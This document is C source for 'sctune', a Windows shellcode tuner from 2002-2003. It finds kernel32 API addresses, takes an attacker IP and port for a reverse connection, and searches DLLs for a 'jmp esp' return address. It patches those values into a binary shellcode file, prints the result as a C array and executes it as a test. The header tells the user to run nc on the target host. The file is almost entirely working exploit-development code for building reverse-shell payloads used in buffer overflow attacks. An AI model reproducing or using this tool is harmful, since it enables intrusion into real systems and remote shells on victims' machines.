/*

sctune.c v1.2 (c) 2002-2003 by 3APA3A
http://www.security.nnov.ru/soft/

  Shellcode tuner
  usage: sctune [bincode] > shellcode.c

  bincode (optional) - filename with binary shellcode, shellcod.bin by default
  Output consists of 2 "C" constants - address of jmp esp instruction in memory and
  char array of tuned shellcode.

  What it does:

  1. Finds addresses of 4 required export functions from kernel32.dll
     (LoadLibraryA, GetProcAddress, CreateProcessA, ExitProcess).
  2. Ascs for IP address and port for reverse connection
  3. Looks for jmp esp instruction in different DLLs memory space
     DLL may be taken from standard set or specified by user
  4. Loads binary shellcode into memory and applies all parameters
  5. Dumps produced C code to stdout
  6. Tests shellcode with specified parameters (start nc on target host before)

*/

#include <stdio.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <io.h>
#include <windows.h>

typedef void (*FUNC)(void);
typedef int (*WSAFUNC)(WORD,LPWSADATA);


DWORD FindESP(LPSTR startaddr, int dobreak)
{
    LPSTR  lpOffset = 0;
    LPSTR  lpBuf = 0;
    DWORD  dwRead = 0;
    SYSTEM_INFO si = {0};
        HANDLE hMe;
        DWORD result;

    unsigned i;

                hMe = GetCurrentProcess();
                SetPriorityClass(hMe, IDLE_PRIORITY_CLASS);
        GetSystemInfo(&si);
        lpBuf = (LPSTR)malloc(si.dwPageSize + 1);
        for((void*)lpOffset = startaddr?startaddr:si.lpMinimumApplicationAddress;
            (void*)lpOffset <= si.lpMaximumApplicationAddress;
            lpOffset += si.dwPageSize)
        {
            if(ReadProcessMemory( hMe,
                lpOffset,
                lpBuf,
                si.dwPageSize,
                &dwRead))
            {
                                for(i=0; i < (dwRead - 1); ) {
                                        if((unsigned char)lpBuf[i++] ==  0xFF && (unsigned char)lpBuf[i++] == 0xE4){
                                                result = (DWORD)(lpOffset+i-2);
                                                if((result&0xff000000)&&(result&0x00ff0000)&&(result&0x0000ff00)&&(result&0x000000ff))
                                                        return result;
                                        }
                                }
            }
            else if (dobreak) break;
        }
    return 0;
}

char * modules[] = {
        "kernel32.dll",
        "msvcrt.dll",
        "ws2_32.dll",
        "user32.dll",
        "advapi32.dll",
        "gdi32.dll",
        NULL,
};

int main(int argc, char* argv[]){
        unsigned char buf[10240];
        int fd;
        HMODULE h;
        WSADATA wd;
        FUNC f;
        WSAFUNC wsastartup;
        char *file;
        char * module;
        unsigned LLA,GPA,CPA,EP,IP=0,ESP;
        unsigned d1, d2, d3, d4;
        unsigned short port, port1;
        unsigned char * loc;
        unsigned len, i;
        char yn[2];
        int m=0;

        file = (argc>1)?argv[1]:"shellcod.bin";

        h=LoadLibrary("kernel32.dll");
        LLA=(unsigned)GetProcAddress(h, "LoadLibraryA");
        GPA=(unsigned)GetProcAddress(h, "GetProcAddress");
        CPA=(unsigned)GetProcAddress(h, "CreateProcessA");
        EP=(unsigned)GetProcAddress(h, "ExitProcess");
        fprintf(stderr,"LoadLibraryA [%08x]: ", LLA);
        fgets(buf,sizeof(buf), stdin);
        sscanf(buf,"%08x", &LLA);
        fprintf(stderr,"GetProcAddress [%08x]: ", GPA);
        fgets(buf,sizeof(buf), stdin);
        sscanf(buf,"%08x", &GPA);
        fprintf(stderr,"CreateProcessA [%08x]: ", CPA);
        fgets(buf,sizeof(buf), stdin);
        sscanf(buf,"%08x", &CPA);
        fprintf(stderr,"ExitProcess: [%08x]: ", EP);
        fgets(buf,sizeof(buf), stdin);
        sscanf(buf,"%08x", &EP);
        for(;;){
                fprintf(stderr,"IP: ");
                fgets(buf,sizeof(buf), stdin);
                d1=d2=d3=d4=0;
                sscanf((char *)buf, "%u.%u.%u.%u", &d1, &d2, &d3, &d4);
                IP = (d4<<24) ^ (d3<<16) ^ (d2<<8) ^ d1;
                if((IP&0xff000000)&&(IP&0x00ff0000)&&(IP&0x0000ff00)&&(IP&0x000000ff))break;
                fprintf(stderr, "IP should not contain 0\'s\n");
        }
        fprintf(stderr,"PORT [80]: ");
        fgets(buf,sizeof(buf), stdin);
        port1 = (unsigned short)atoi(buf);
        port1 = (port1!=0)?port1:(unsigned short)80;
        port = (port1<<8)^(port1>>8); /*htons()*/
        module = modules[0];
        for(;;){
                fprintf(stderr, "try module (\"n\" to break)[%s] : ", modules[m]?modules[m]:"no");
                fgets(buf,sizeof(buf),stdin);
                if((buf[1]=='\n' || buf[1]=='\r' || buf[1] == 0) && (buf[0] == 'n' || buf[0] == 'N'))break;
                if(buf[0] == '\n' || buf[0] == '\r' || buf[0] == 0) {
                        if(!modules[m]) break;
                        module = modules[m++];
                }
                else {
                        loc = strchr(buf, '\n');
                        if(loc)*loc = 0;
                        loc = strchr(buf, '\r');
                        if(loc)*loc = 0;
                        module=buf;
                }
                h=LoadLibrary(module);
                if(!h)fprintf(stderr, "Failed to load %s\n", buf);
                ESP=FindESP((LPSTR)h, 1);
                if(ESP)break;
        }
        fprintf(stderr,"jmp esp address [%s/%08x]: ", module, ESP);
        fgets(buf,sizeof(buf), stdin);
        sscanf(buf,"%08x", &GPA);
        fflush(stderr);
        fprintf(stdout,"int jmpesp=0x%08x;\n", ESP);
        fflush(stdout);

        memset(buf,0, sizeof(buf));

        fd = open(file, O_RDONLY);
        if(fd < 0){
                fprintf(stderr, "failed to open shellcode file:\n", file);
                return 10;
        }
        fprintf(stderr,"%u bytes of shellcode red into memory\n", len=(unsigned)read(fd, buf, sizeof(buf)));
        fprintf(stderr,"strlen of buf is %d\n", strlen(buf));
        while((loc = strstr(buf,"ABCD")))
                *((unsigned *)loc) = LLA;
        while((loc = strstr(buf,"EFGH")))
                *((unsigned *)loc) = GPA;
        while((loc = strstr(buf,"IJKL")))
                *((unsigned *)loc) = CPA;
        while((loc = strstr(buf,"MNOP")))
                *((unsigned *)loc) = EP;
        while((loc = strstr(buf,"QRST")))
                *((unsigned *)loc) = IP;
        while((loc = strstr(buf,"UV"))){
                if(port&0x00ff && port&0xff00){
                        *((unsigned short*)loc) = port;
                        loc[2]=0x90;
                        loc[3]=0x90;
                }
                else if(!(port&0x00ff)){
                        *((unsigned short*)loc) = (port^0x0041);
                }
                else {
                        *((unsigned short*)loc) = (port^0x4100);
                        loc[3]=0xFF;
                }
        }

        
        fflush(stderr);
        fprintf(stdout,"unsigned char shellcode[] =\n\t\"");
        for(i=0; i<len; i++){
                fprintf(stdout, "\\x%02x", (unsigned) buf[i]);
                if((i%16)==15)fprintf(stdout, "\"\n\t\"");
        }
        fprintf(stdout, "\";\n");
        fflush(stdout);

        f = (FUNC)buf;
        fprintf(stderr,"\nTest [y]:");
        fgets(yn, 2, stdin);
        if(*yn == 'Y' || *yn == 'y' || *yn == '\n') {
                h=LoadLibrary("ws2_32.dll");
                wsastartup=(WSAFUNC)GetProcAddress(h, "WSAStartup");
                wsastartup(0x0101, &wd);
                f();    
        }
        return 0;
}